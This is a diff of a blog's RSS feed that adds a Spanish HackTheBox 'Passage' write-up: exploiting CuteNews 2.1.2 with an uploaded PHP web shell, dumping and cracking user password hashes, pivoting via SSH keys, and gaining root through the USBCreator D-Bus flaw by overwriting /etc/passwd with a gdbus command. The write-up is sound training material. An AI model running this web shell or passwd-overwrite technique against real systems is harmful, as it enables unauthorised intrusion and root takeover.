@@ -5,13 +5,13 @@
     <description>Articulos, Writeups, Htb, Programación y Noticias sobre Ciberseguridad</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Mon, 17 Apr 2023 18:46:33 +0000</pubDate>
-    <lastBuildDate>Mon, 17 Apr 2023 18:46:33 +0000</lastBuildDate>
+    <pubDate>Tue, 18 Apr 2023 02:05:57 +0000</pubDate>
+    <lastBuildDate>Tue, 18 Apr 2023 02:05:57 +0000</lastBuildDate>
     <generator>Jekyll v3.9.0</generator>
     
       <item>
         <title>Maquina Passage - htb writeup</title>
-        <description>&lt;p&gt;El dia de hoy vamos a estar resolviendo la maquina Passage de &lt;code&gt;hackthebox&lt;/code&gt; que es una maquina &lt;code&gt;Linux&lt;/code&gt; de dificultad &lt;code&gt;Media&lt;/code&gt;. Para explotar esta maquina abusaremos una vulnerabilidad de &lt;code&gt;Cute News&lt;/code&gt;, haremos analisis de codigo para descubrir ciertos recursos y finalmente para escalar privilegios como el usuario &lt;code&gt;root&lt;/code&gt; nos aprovecharemos de &lt;code&gt;USBCreator&lt;/code&gt;&lt;/p&gt;
+        <description>&lt;p&gt;El dia de hoy vamos a estar resolviendo la maquina Passage de &lt;code&gt;hackthebox&lt;/code&gt; que es una maquina &lt;code&gt;Linux&lt;/code&gt; de dificultad &lt;code&gt;Media&lt;/code&gt;. Para explotar esta maquina abusaremos una vulnerabilidad de &lt;code&gt;Cute News&lt;/code&gt; con la que obtendremos ejecución remota de comandos, despues haremos un analisis de codigo de un repositorio publico en github para descubrir ciertos recursos y finalmente para escalar privilegios como el usuario &lt;code&gt;root&lt;/code&gt; nos aprovecharemos de &lt;code&gt;USBCreator&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;Vamos a comenzar como de costrumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;
 
@@ -177,21 +177,21 @@ http://10.10.10.206 [200 OK] Apache[2.4.18], Bootstrap, Cookies[CUTENEWS_SESSION
 &lt;p&gt;Verificamos si hay algun exploit publico &lt;code&gt;searchsploit&lt;/code&gt; y efectivamente existen vulnerabilidades asociadas a esta versión especifica &lt;code&gt;2.1.2&lt;/code&gt;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit cutenews 2.1.2
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------
- Exploit Title                                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------
-CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)                                                                                         | php/remote/46698.rb
-CuteNews 2.1.2 - Arbitrary File Deletion                                                                                                             | php/webapps/48447.txt
-CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                                                                 | php/webapps/48458.txt
-CuteNews 2.1.2 - Remote Code Execution                                                                                                               | php/webapps/48800.py
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------------------
+ Exploit Title                                                                                                                         |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------------------
+CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)                                                                           | php/remote/46698.rb
+CuteNews 2.1.2 - Arbitrary File Deletion                                                                                               | php/webapps/48447.txt
+CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                                                   | php/webapps/48458.txt
+CuteNews 2.1.2 - Remote Code Execution                                                                                                 | php/webapps/48800.py
+------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Shellcodes: No Results
 Papers: No Results
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;Tenemos exploits que corresponden a &lt;code&gt;RCE&lt;/code&gt;, el primero de ellos nos habla de algo asociado con &lt;code&gt;avatar&lt;/code&gt;, podemos investigar de que trata el exploit trayendonoslo a nuestro directorio. Pero primero recordemos que en el panel de login, existia la opción de registrar un nuevo usuario.&lt;/p&gt;
 
-&lt;p&gt;Vamos a proceder a registrarnos en el servicio.&lt;/p&gt;
+&lt;p&gt;Procedamos a registrarnos en el servicio.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
@@ -233,7 +233,7 @@ Papers: No Results
 &lt;p&gt;Puedes ver este articulo, para comprender a mayor detalle el uso de &lt;code&gt;Magic Numbers&lt;/code&gt;&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;&lt;img src=&quot;https://en.wikipedia.org/wiki/List_of_file_signatures&quot; alt=&quot;https://en.wikipedia.org/wiki/List_of_file_signatures&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/List_of_file_signatures&quot;&gt;https://en.wikipedia.org/wiki/List_of_file_signatures&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;Como ya sabemos en que consiste la vulnerabilidad, en vez de hacer uso del exploit. Crearemos un archivo &lt;code&gt;php&lt;/code&gt; con esas caracteristicas, que nos permita la ejecución de comandos mediante el uso de un parametro definido &lt;code&gt;cmd&lt;/code&gt; en conjunto con la función &lt;code&gt;shell_exec&lt;/code&gt;. Seguidamente subiremos el archivo.&lt;/p&gt;
@@ -245,6 +245,7 @@ GIF8;
     echo &quot;&amp;lt;pre&amp;gt;&quot; . shell_exec($_REQUEST['cmd']) . &quot;&amp;lt;/pre&amp;gt;&quot;;
 ?&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;El archivo se sube correctamente y consecuentemente inspeccionamos la ruta en donde se encuentra nuestro archivo.&lt;/p&gt;
@@ -306,7 +307,7 @@ www-data@passage:/var/www/html/CuteNews/uploads$ stty rows 45 columns 174
 &lt;p&gt;Existe un repositorio de &lt;code&gt;CuteNews&lt;/code&gt; publico en github:&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;&lt;img src=&quot;https://github.com/CuteNews/cutenews-2.0&quot; alt=&quot;https://github.com/CuteNews/cutenews-2.0&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/CuteNews/cutenews-2.0&quot;&gt;https://github.com/CuteNews/cutenews-2.0&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;Aqui nos habla que para agregar comentarios, perfiles o cualquier información, no necesita hacer uso de un gestor de base de datos como &lt;code&gt;mysql&lt;/code&gt;. Revisando el repositorio podemos ver que la data lo almacena en un directorio de nombre &lt;code&gt;cdata&lt;/code&gt;.&lt;/p&gt;
@@ -335,33 +336,229 @@ YToxOntzOjQ6Im5hbWUiO2E6MTp7czo4OiJmbWlyYWNsZSI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNjgx
 &lt;p&gt;Ya que el formato esta en &lt;code&gt;base64&lt;/code&gt; usaremos un &lt;code&gt;base64 -d&lt;/code&gt; para decodificarla y vemos el &lt;code&gt;hash&lt;/code&gt; correspondiente a la contraseña.&lt;/p&gt;
 
 &lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@passage:/var/www/html/CuteNews/cdata/users$ echo &quot;YToxOntzOjQ6Im5hbWUiO2E6MTp7czo4OiJmbWlyYWNsZSI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNjgxNzUwODAyIjtzOjQ6Im5hbWUiO3M6ODoiZm1pcmFjbGUi3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MjE6ImZtaXJhY2xlQGZtaXJhY2xlLmNvbSI7czo0OiJuaWNrIjtzOjg6ImZtaXJhY2xlIjtzOjQ6InBhc3MiO3M6NjQ6IjQ4Yjg0MWJlYTIwNWZkYjJkNjAxNDBhODljOGIzMDA2MThmWNhMjAwZDI2YmQyY2Q0YmQyYzBmNTk4MTgzODMiO3M6NDoibW9yZSI7czo2MDoiWVRveU9udHpPalE2SW5OcGRHVWlPM002TURvaUlqdHpPalU2SW1GaWIzVjBJanR6T2pBNklpSTdmUT09IjtzOjY6ImF2YXRhciI7czoyMzoiYXZhdGFyX2ZtXJhY2xlX2NtZC5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX19www-data@passage&quot; | base64 -d; echo
+
 a:1:{s:4:&quot;name&quot;;a:1:{s:8:&quot;fmiracle&quot;;a:9:{s:2:&quot;id&quot;;s:10:&quot;1681750802&quot;;s:4:&quot;name&quot;;s:8:&quot;fmiracle&quot;;s:3:&quot;acl&quot;;s:1:&quot;4&quot;;s:5:&quot;email&quot;;s:21:&quot;fmiracle@fmiracle.com&quot;;s:4:&quot;nick&quot;;s:8:&quot;fmiracle&quot;;s:4:&quot;pass&quot;;s:64:&quot;48b841bea205fdb2d60140a89c8b300618faca200d26bd2cd4bd2c0f59818383&quot;;s:4:&quot;more&quot;;s:60:&quot;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&quot;;s:6:&quot;avatar&quot;;s:23:&quot;avatar_fmiracle_cmd.php&quot;;s:6:&quot;e-hide&quot;;s:0:&quot;&quot;;}}}
                                           base64: invalid input
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;Vamos a realizar el mismo proceso para todos los archivos y visualizaremos los hashes correspondientes a sus contraseñas&lt;/p&gt;
+&lt;p&gt;Vamos a realizar el mismo proceso para todos los archivos y visualizaremos los hashes correspondientes a los usuarios registrados.&lt;/p&gt;
 
 &lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@passage:/var/www/html/CuteNews/cdata/users$ cat * | grep -v &quot;denied&quot; | base64 -d; echo
 a:1:{s:5:&quot;email&quot;;a:1:{s:16:&quot;paul@passage.htb&quot;;s:10:&quot;paul-coles&quot;;}}a:1:{s:2:&quot;id&quot;;a:1:{i:1598829833;s:6:&quot;egre55&quot;;}}a:1:{s:5:&quot;email&quot;;a:1:{s:15:&quot;egre55@test.com&quot;;s:6:&quot;egre55&quot;;}}a:1:{s:4:&quot;name&quot;;a:1:{s:5:&quot;admin&quot;;a:8:{s:2:&quot;id&quot;;s:10:&quot;1592483047&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;acl&quot;;s:1:&quot;1&quot;;s:5:&quot;email&quot;;s:17:&quot;nadav@passage.htb&quot;;s:4:&quot;pass&quot;;s:64:&quot;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592487988&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;2&quot;;}}}a:1:{s:2:&quot;id&quot;;a:1:{i:1592483281;s:9:&quot;sid-meier&quot;;}}a:1:{s:5:&quot;email&quot;;a:1:{s:17:&quot;nadav@passage.htb&quot;;s:5:&quot;admin&quot;;}}a:1:{s:5:&quot;email&quot;;a:1:{s:15:&quot;kim@example.com&quot;;s:9:&quot;kim-swift&quot;;}}a:1:{s:2:&quot;id&quot;;a:1:{i:1592483236;s:10:&quot;paul-coles&quot;;}}a:1:{s:4:&quot;name&quot;;a:1:{s:9:&quot;sid-meier&quot;;a:9:{s:2:&quot;id&quot;;s:10:&quot;1592483281&quot;;s:4:&quot;name&quot;;s:9:&quot;sid-meier&quot;;s:3:&quot;acl&quot;;s:1:&quot;3&quot;;s:5:&quot;email&quot;;s:15:&quot;sid@example.com&quot;;s:4:&quot;nick&quot;;s:9:&quot;Sid Meier&quot;;s:4:&quot;pass&quot;;s:64:&quot;4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592485645&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;2&quot;;}}}a:1:{s:2:&quot;id&quot;;a:1:{i:1592483047;s:5:&quot;admin&quot;;}}a:1:{s:5:&quot;email&quot;;a:1:{s:15:&quot;sid@example.com&quot;;s:9:&quot;sid-meier&quot;;}}a:1:{s:4:&quot;name&quot;;a:1:{s:10:&quot;paul-coles&quot;;a:9:{s:2:&quot;id&quot;;s:10:&quot;1592483236&quot;;s:4:&quot;name&quot;;s:10:&quot;paul-coles&quot;;s:3:&quot;acl&quot;;s:1:&quot;2&quot;;s:5:&quot;email&quot;;s:16:&quot;paul@passage.htb&quot;;s:4:&quot;nick&quot;;s:10:&quot;Paul Coles&quot;;s:4:&quot;pass&quot;;s:64:&quot;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592485556&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;2&quot;;}}}a:1:{s:4:&quot;name&quot;;a:1:{s:9:&quot;kim-swift&quot;;a:9:{s:2:&quot;id&quot;;s:10:&quot;1592483309&quot;;s:4:&quot;name&quot;;s:9:&quot;kim-swift&quot;;s:3:&quot;acl&quot;;s:1:&quot;3&quot;;s:5:&quot;email&quot;;s:15:&quot;kim@example.com&quot;;s:4:&quot;nick&quot;;s:9:&quot;Kim Swift&quot;;s:4:&quot;pass&quot;;s:64:&quot;f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592487096&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;3&quot;;}}}a:1:{s:4:&quot;name&quot;;a:1:{s:6:&quot;egre55&quot;;a:11:{s:2:&quot;id&quot;;s:10:&quot;1598829833&quot;;s:4:&quot;name&quot;;s:6:&quot;egre55&quot;;s:3:&quot;acl&quot;;s:1:&quot;4&quot;;s:5:&quot;email&quot;;s:15:&quot;egre55@test.com&quot;;s:4:&quot;nick&quot;;s:6:&quot;egre55&quot;;s:4:&quot;pass&quot;;s:64:&quot;4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc&quot;;s:4:&quot;more&quot;;s:60:&quot;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&quot;;s:3:&quot;lts&quot;;s:10:&quot;1598834079&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:6:&quot;avatar&quot;;s:26:&quot;avatar_egre55_spwvgujw.php&quot;;s:6:&quot;e-hide&quot;;s:0:&quot;&quot;;}}}a:1:{s:2:&quot;id&quot;;a:1:{i:1592483309;s:9:&quot;kim-swift&quot;;}}
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;Ahora intentaremos crackear todos estos hashes&lt;/p&gt;
+&lt;p&gt;De los hashes obtenidos procederemos a crackearlos en nuestra web de confianza.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://crackstation.net/&quot;&gt;https://crackstation.net/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Logramos obtener unas contraseñas en texto claro.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora intentaremos logearnos con algunos de los usuarios del sistema, haciendo uso de las contraseñas que obtuvimos y conseguimos logearnos como el usuario &lt;code&gt;paul&lt;/code&gt;. Podemos ir a su directorio de trabajo y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@passage:/var/www/html/CuteNews/cdata/users$ su paul
+Password: 
+paul@passage:/var/www/html/CuteNews/cdata/users$ cd /home/paul/
+paul@passage:~$ cat user.txt 
+9914c80b41f867472dd68c1e54c77609
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Enumerando al usuario &lt;code&gt;paul&lt;/code&gt;, encontramos que tenemos un directorio oculto &lt;code&gt;.ssh&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;paul@passage:~$ ls -la
+total 112
+drwxr-x--- 16 paul paul 4096 Sep  2  2020 .
+drwxr-xr-x  4 root root 4096 Jul 21  2020 ..
+----------  1 paul paul    0 Jul 21  2020 .bash_history
+-rw-r--r--  1 paul paul  220 Aug 31  2015 .bash_logout
+-rw-r--r--  1 paul paul 3770 Jul 21  2020 .bashrc
+drwx------ 10 paul paul 4096 Sep  1  2020 .cache
+drwx------ 14 paul paul 4096 Aug 24  2020 .config
+drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Desktop
+-rw-r--r--  1 paul paul   25 Aug 24  2020 .dmrc
+drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Documents
+drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Downloads
+-rw-r--r--  1 paul paul 8980 Apr 20  2016 examples.desktop
+drwx------  2 paul paul 4096 Aug 24  2020 .gconf
+drwx------  3 paul paul 4096 Sep  2  2020 .gnupg
+-rw-------  1 paul paul 1292 Sep  2  2020 .ICEauthority
+drwx------  3 paul paul 4096 Aug 24  2020 .local
+drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Music
+drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Pictures
+-rw-r--r--  1 paul paul  655 May 16  2017 .profile
+drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Public
+drwxr-xr-x  2 paul paul 4096 Jul 21  2020 .ssh
+drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Templates
+-r--------  1 paul paul   33 Apr 17 09:08 user.txt
+drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Videos
+-rw-------  1 paul paul   52 Sep  2  2020 .Xauthority
+-rw-------  1 paul paul 1228 Sep  2  2020 .xsession-errors
+-rw-------  1 paul paul 1397 Sep  1  2020 .xsession-errors.old
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Dentro del directorio podemos visualizar una clave &lt;code&gt;authorized_keys&lt;/code&gt;, que pertenece al usuario &lt;code&gt;nadav&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;paul@passage:~/.ssh$ ls
+authorized_keys  id_rsa  id_rsa.pub  known_hosts
+paul@passage:~/.ssh$ cat authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Por principios basicos de claves &lt;code&gt;ssh&lt;/code&gt; al tener la clave publica del usuario &lt;code&gt;nadav&lt;/code&gt;, puedo conectarme como a la propia maquina sin proporcionar contraseña.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;paul@passage:~/.ssh$ ssh nadav@127.0.0.1
+The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:oRyj2rNWOCrVh9SCgFGamjppmxqJUlGgvI4JSVG75xg.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
+Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1
+nadav@passage:~$ whoami
+nadav
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora que somos el usuario &lt;code&gt;nadav&lt;/code&gt;, listamos los recursos de su directorio personal y tratando de leer los archivos ocultos, vemos el contenido del archivo &lt;code&gt;viminfo&lt;/code&gt;, el cual hace bastante mención a un archivo &lt;code&gt;USBCreator&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nadav@passage:~$ cat .viminfo 
+# This viminfo file was generated by Vim 7.4.
+# You may edit it if you're careful!
+
+# Value of 'encoding' when this file was written
+*encoding=utf-8
+
+
+# hlsearch on (H) or off (h):
+~h
+# Last Substitute Search Pattern:
+~MSle0~&amp;amp;AdminIdentities=unix-group:root
+
+# Last Substitute String:
+$AdminIdentities=unix-group:sudo
+
+# Command Line History (newest to oldest):
+:wq
+:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g
+
+# Search String History (newest to oldest):
+? AdminIdentities=unix-group:root
+
+# Expression History (newest to oldest):
+
+# Input Line History (newest to oldest):
+
+# Input Line History (newest to oldest):
+
+# Registers:
+
+# File marks:
+'0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
+'1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
+
+# Jumplist (newest first):
+-'  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
+-'  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
+-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
+-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
+-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
+-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
+
+# History of marks within files (newest to oldest):
+
+&amp;gt; /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
+	&quot;	12	7
+
+&amp;gt; /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
+	&quot;	2	0
+	.	2	0
+	+	2	0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Como hace mucha referencia a el archivo &lt;code&gt;USBCreator&lt;/code&gt;, vamos a proceder a buscar si exiten vulnerabilidades asociadas y concretamente entramos una relacionada a &lt;code&gt;Privilege Escalataion&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Aqui el articulo para mayor detalle:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/&quot;&gt;https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;En resumen la vulnerabilidad aprovecha una cierta capacidad de sobrescritura de los permisos de un archivo usando el comando &lt;code&gt;gdbus&lt;/code&gt;, cambiandolos por los del usuario privilegiado &lt;code&gt;root&lt;/code&gt;.
+Podemos aprovecharnos de esta vulnerabilidad de muchas maneras. Concretamente en este caso primero realizaremos una copia del &lt;code&gt;/etc/passwd&lt;/code&gt; de la maquina y lo modificaremos agregando una contraseña que vamos a computar con &lt;code&gt;openssl&lt;/code&gt; al usuario &lt;code&gt;root&lt;/code&gt;. Y una vez tengamos el archivo modificado aprovecharemos de esta vulnerabilidad para sobrescribir el archivo original del &lt;code&gt;/etc/passwd&lt;/code&gt; con el nuevo que tenemos, de modo que al haberle cambiado la contraseña a &lt;code&gt;root&lt;/code&gt; podamos convertirnos en el con la contraeñas que le indicamos.&lt;/p&gt;
+
+&lt;p&gt;Vamos a hacerlo paso a paso para que se entienda:&lt;/p&gt;
+
+&lt;p&gt;Primero nos copias el &lt;code&gt;/etc/passwd&lt;/code&gt; para evitar problemas de permisos lo haremos en la ruta &lt;code&gt;tmp&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nadav@passage:/tmp$ cp /etc/passwd .
+nadav@passage:/tmp$ ls
+config-err-QHQCht                                                       systemd-private-70af303641bf4fb2935fb9f554b4ff23-fwupd.service-rSKHgW              unity_support_test.0
+passwd                                                                  systemd-private-70af303641bf4fb2935fb9f554b4ff23-rtkit-daemon.service-1jCj09       VMwareDnD
+systemd-private-70af303641bf4fb2935fb9f554b4ff23-colord.service-h1Z4SP  systemd-private-70af303641bf4fb2935fb9f554b4ff23-systemd-timesyncd.service-zchybP  vmware-root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Una vez tenemos el &lt;code&gt;passwd&lt;/code&gt;, vamos a crearnos una contraseña, la cual tiene que estar en formato &lt;code&gt;desk unix&lt;/code&gt;. Eso lo hacemos con &lt;code&gt;openssl passwd&lt;/code&gt;, el cual nos pedira una contraseña. En este caso le pondre algo simple como la palabra &lt;code&gt;hola&lt;/code&gt;, pero se puede poner cualquier cosa.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nadav@passage:/tmp$ openssl passwd
+Password: 
+Verifying - Password: 
+POoz1bD1QhbD.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Seguidamente debemos modifcar el &lt;code&gt;passwd&lt;/code&gt; y en &lt;code&gt;root&lt;/code&gt;. Para esto reeemplazamos la &lt;code&gt;x&lt;/code&gt; por nuestra contraseña.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nadav@passage:/tmp$ cat passwd 
+root:POoz1bD1QhbD.:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nolog
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Despues tal y como nos dice la vulnerabilidad, usamos el comando &lt;code&gt;gdbuss&lt;/code&gt; tal cual los parametros mencionados y le indicamos primero nuestro archivo &lt;code&gt;/tmp/passwd&lt;/code&gt;y seguido la ruta original donde lo sobreescribiremos &lt;code&gt;/etc/passwd&lt;/code&gt; finalmente el parametro &lt;code&gt;true&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nadav@passage:/tmp$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /tmp/passwd /etc/passwd true
+()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora proceremos a leer el archivo &lt;code&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nadav@passage:/tmp$ cat /etc/passwd
+root:POoz1bD1QhbD.:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vemos que efectivamente lo modificamos la contraseña del usuario &lt;code&gt;root&lt;/code&gt;. Lo que nos queda ahora es migrar al usuario &lt;code&gt;root&lt;/code&gt;, dirigirnos a su directorio personal y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nadav@passage:/tmp$ su root
+Password: 
+root@passage:/tmp# cd /root
+root@passage:~# cat root.txt
+36b5bcee8e0d7f4be426e8016250dd7f
+root@passage:~#
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Esto seria todo por esta ocasión 😄&lt;/p&gt;
 </description>
         <pubDate>Mon, 17 Apr 2023 00:00:00 +0000</pubDate>
         <link>http://localhost:4000/hackthebox/htb-writeup-Passage</link>
         <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Passage</guid>
         
-        <category>Adobe Coldfusion</category>
+        <category>CuteNews Explotation</category>
         
-        <category>Directory traversal</category>
+        <category>Code Analysis</category>
         
-        <category>Cracking hash</category>
-        
-        <category>Schedule Tasks</category>
-        
-        <category>Create malicius JSP</category>
-        
-        <category>Abusing SeimpersonatePrivilege</category>
+        <category>USBCreator D-Bus</category>
         
         
         <category>hackthebox</category>
